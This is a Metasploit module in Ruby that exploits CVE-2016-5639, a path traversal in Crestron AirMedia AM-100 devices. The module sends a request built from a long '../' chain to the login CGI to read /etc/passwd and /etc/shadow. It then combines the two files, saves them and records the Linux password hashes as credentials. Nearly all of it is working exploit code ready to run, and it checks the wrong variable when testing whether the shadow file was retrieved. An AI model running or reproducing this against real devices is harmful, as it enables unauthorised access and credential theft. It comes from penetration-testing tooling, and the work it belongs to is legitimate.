##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

    def initialize
        super(
            'Name'        => 'Crestron AirMedia AM-100 Linux Password Hash Dump',
            'Description' => %q{
                This module exploits a path traversal in Crestron AirMedia AM-100 devices with
                firmware version <1.4.0.13. This module extracts and de-shadows Linux 
                password hashes from the device (not the AirMedia application passwords).
            },
            'References'  => [
                [ 'CVE', 'CVE-2016-5639' ],
                [ 'URL', 'https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md' ]
            ],
            'Author'      => [
              'Forrest'
            ],
            'License'     => MSF_LICENSE,
            'DefaultOptions' => {
                'SSL'     => true
            },
            'DisclosureDate' => "2016-08-01"
        )
        register_options(
            [
                Opt::RPORT(443),
                OptBool.new('SSL', [true, 'Use SSL', true])
            ], self.class
        )
    end

    # Function for attempting the directory traversal
    def get_file_function(file_path, opts = {})
        begin
            res = send_request_cgi(
                {
                  'uri'     => normalize_uri("/cgi-bin/login.cgi?lang=en&src=../../../../../../../../../../../../../../../../../../../..", file_path),
                  'method'  => 'GET',
                  'ssl'     => true,
                  'port'    => rport
                }
            )
            return res
            
        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
            print_error("#{rhost}:#{rport} - HTTP(S) Connection Failed...")
            return
        end
    end
  
    
    def run
        print_status("#{rhost}:#{rport} - Attempting path traversal to files...")
        
        passwd_response = get_file_function("/etc/passwd")
        good_passwd_response = (
            passwd_response &&
            passwd_response.code == 200
        )
        
        if good_passwd_response
            print_good("#{rhost}:#{rport} - Successfully retrieved /etc/passwd...")
            path = store_loot("linux.passwd", "application/octet-stream", rhost, passwd_response.body, "passwd", "Linux Passwd File")
            print_good("Saved /etc/passwd to: " << path)
        else
            print_error("#{rhost}:#{rport} - Failed to retrieve /etc/passwd...")
            return false
        end
        
        
        
        shadow_response = get_file_function("/etc/shadow")
        good_shadow_response = (
            shadow_response &&
            shadow_response.code == 200
        )
        
        if shadow_response
            print_good("#{rhost}:#{rport} - Successfully retrieved /etc/shadow...")
            path = store_loot("linux.shadow", "application/octet-stream", rhost, shadow_response.body, "shadow", "Linux Shadow File")
            print_good("Saved /etc/shadow to: " << path)
        else
            print_error("#{rhost}:#{rport} - Failed to retrieve /etc/shadow...")
            return false
        end
        
        # Stolen from post/linux/gather/hashdump
        john_file = unshadow(passwd_response.body, shadow_response.body)
        
        john_file.each_line do |l|
            hash_parts = l.split(':')
            credential_data = {
                jtr_format: 'md5,des,bsdi,crypt',
                origin_type: :service,
                post_reference_name: self.refname,
                private_type: :nonreplayable_hash,
                private_data: hash_parts[1],
                username: hash_parts[0],
                workspace_id: myworkspace_id
            }
            create_credential(credential_data)
            print_good("    #{l.chomp}")
        end
        
        path = store_loot("crestron_linux.hashes", "text/plain", rhost, john_file, "unshadowed_passwd.pwd", "Linux Unshadowed Password File")
        print_good("File saved to path: " << path)
    end
  
    # Stolen from post/linux/gather/hashdump
    def unshadow(pf,sf)
        unshadowed = ""
        sf.each_line do |sl|
            pass = sl.scan(/^\w*:([^:]*)/).join
            if pass !~ /^\*|^!$/
                user = sl.scan(/(^\w*):/).join
                pf.each_line do |pl|
                    if pl.match(/^#{user}:/)
                        unshadowed << pl.gsub(/:x:/,":#{pass}:")
                    end
                end
            end
        end
        unshadowed
    end  
  
end
